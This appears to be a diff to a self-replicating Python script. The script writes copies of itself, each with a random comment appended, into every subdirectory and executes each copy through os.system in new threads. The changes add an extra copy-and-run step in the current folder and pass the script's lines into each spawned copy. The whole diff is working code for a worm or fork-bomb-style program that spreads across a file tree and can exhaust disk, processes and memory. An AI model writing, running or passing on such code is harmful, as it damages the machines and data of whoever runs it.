@@ -43,14 +43,17 @@ def previousFolder(file, lines):
                 file.write("\nos.chdir('../')\n")
 
 
-def runFunc(dir, filename):
+def runFunc(dir, filename, lines):
     os.chdir(dir)
+    print(dir)
     g = open(".\\" + filename, "w")
     writeIntoFile(g, lines)
     g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
     g.close()
     os.system('python3 .\\' + filename)
 
+def runFuncv(filename):
+    os.system('python3 ' + filename)
 
 # get the current file
 thisfile = os.path.basename(__file__)
@@ -81,9 +84,27 @@ filename = "newpython{randomness}.py".format(
 # except:
 #    pass
 
+i = open(".\\" + filename, "w")
+writeIntoFile(i, lines)
+i.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
+i.close()
+
+
+
+def runthread():
+    thread = Thread(target=runFuncv(".\\" + filename))
+    thread.start()
+
+
+thread = Thread(target=runthread)
+thread.start()
+
+print("I made it htis far")
 
 for x in os.walk(directory):
-    thread = Thread(target=runFunc(x[0], filename))
+    if x[0] == os.getcwd():
+        continue
+    thread = Thread(target=runFunc(x[0], filename, lines))
     thread.start()
 
 # Ensure this thread gets closed
